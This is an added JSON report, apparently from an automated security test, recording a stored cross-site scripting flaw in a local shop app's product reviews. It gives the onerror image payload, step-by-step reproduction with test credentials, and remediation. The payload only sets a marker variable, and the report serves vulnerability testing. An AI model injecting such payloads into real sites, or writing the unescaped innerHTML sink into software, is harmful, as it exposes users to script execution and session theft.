@@ -1,0 +1,58 @@
+{
+  "testName": "XSS-001",
+  "vulnerability": "Stored Cross-Site Scripting (Stored XSS)",
+  "severity": "Medium",
+  "affectedEndpoints": [
+    "POST /shop/api/products/:id/reviews (storage)",
+    "GET  /shop/products/:id             (render sink)"
+  ],
+  "cwe": "CWE-79: Improper Neutralization of Input During Web Page Generation",
+  "payload": "<img src=\"x\" onerror=\"window.__bugbounty_xss_test='EXECUTED'\">",
+  "reproductionSteps": [
+    "1. Open http://localhost:4000/shop in Chromium via Playwright.",
+    "2. Log in with alice@example.com / Alice123! — session token stored in localStorage.",
+    "3. Navigate to http://localhost:4000/shop/products/prod-001 and submit review: <img src=\"x\" onerror=\"window.__bugbounty_xss_test='EXECUTED'\">",
+    "4. Confirm review is saved verbatim via GET /shop/api/products/prod-001/reviews.",
+    "5. Navigate to http://localhost:4000/shop/products/prod-001 where the review is rendered.",
+    "6. Observe document.getElementById('review-content-X').innerHTML = payload; executes on load.",
+    "7. Confirm window.__bugbounty_xss_test === 'EXECUTED' in the browser page context."
+  ],
+  "evidence": {
+    "browserEngine": "Chromium (Playwright)",
+    "login": {
+      "user": "alice@example.com",
+      "loginUrl": "http://localhost:4000/shop",
+      "tokenRetrieved": true
+    },
+    "reviewSubmission": {
+      "submitPageUrl": "http://localhost:4000/shop/products/prod-001",
+      "reviewId": "review-1",
+      "payloadSubmitted": "<img src=\"x\" onerror=\"window.__bugbounty_xss_test='EXECUTED'\">"
+    },
+    "apiVerification": {
+      "httpStatus": 200,
+      "payloadStoredVerbatim": true,
+      "retrievedContent": "<img src=\"x\" onerror=\"window.__bugbounty_xss_test='EXECUTED'\">"
+    },
+    "sinkInspection": {
+      "renderUrl": "http://localhost:4000/shop/products/prod-001",
+      "containsDangerousInnerHtmlSink": true,
+      "containsPayloadInScript": true,
+      "sinkSnippet": "document.getElementById('review-content-review-1').innerHTML = \"<img src=\\\"x\\\" onerror=\\\"window.__bugbounty_xss_test='EXECUTED'\\\">\";"
+    },
+    "browserExecution": {
+      "renderUrl": "http://localhost:4000/shop/products/prod-001",
+      "markerVariable": "window.__bugbounty_xss_test",
+      "expectedValue": "EXECUTED",
+      "actualValue": "EXECUTED",
+      "executed": true
+    }
+  },
+  "payloadStored": true,
+  "dangerousSinkDetected": true,
+  "javascriptExecuted": true,
+  "testPassed": true,
+  "vulnerabilityReproduced": true,
+  "details": "Review content is accepted and stored without server-side sanitization. The product page renders it via \"innerHTML = <content>\" — a dangerous unescaped sink. Playwright Chromium automation confirmed that the injected onerror handler executed, setting window.__bugbounty_xss_test to \"EXECUTED\". Remediation: escape HTML entities before storage and use textContent instead of innerHTML.",
+  "testedAt": "2026-11-14T06:34:58.721Z"
+}
